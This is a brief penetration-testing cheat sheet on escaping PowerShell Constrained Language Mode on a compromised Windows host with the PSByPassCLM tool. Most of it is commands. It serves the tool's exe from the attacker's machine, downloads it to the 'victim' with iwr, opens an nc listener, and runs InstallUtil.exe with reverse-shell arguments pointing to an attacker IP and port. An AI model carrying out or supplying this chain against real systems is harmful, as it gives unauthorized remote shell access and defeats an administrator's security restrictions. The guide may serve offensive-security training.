# Bypass Constraint Language in PowerShell

Itâ€™s possible that sometimes when you gain access to a Windows machine and you have a PowerShell, that this is in a constraint language context. In the victim machine, you can check that with the `$ExecutionContext.SessionState.LanguageMode` command. PSByPassCLM can bypass this by creating a new reverse shell, you can bypass this context.

Clone the PSByPassCLM repository

```text
git clone https://github.com/padovah4ck/PSByPassCLM
```

Transfer PSByPassCLM.exe to the victim machine, to do this we need a listener:

```text
cd PSByPassCLM/PSByPassCLM/PSBypassCLM/bin/x64/Debug
python -m http.server 80
```

Then we may be able to download the file to our target machine with:

```text
iwr -uri http://10.10.10.11/PsByPassCLM.exe -OutFile c:\temp\psby.exe
```

Set up a listening port to catch a reverse shell connection:

```text
rlwrap nc -nlvp 443
```

Run the reverse shell with the following command:

```text
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.10.11 /rport=443 /U c:\temp\psby.exe
```

In the new shell session, if you type `$ExecutionContext.SessionState.LanguageMode`, you will be able to check if you're in a `FullLanguage` context.
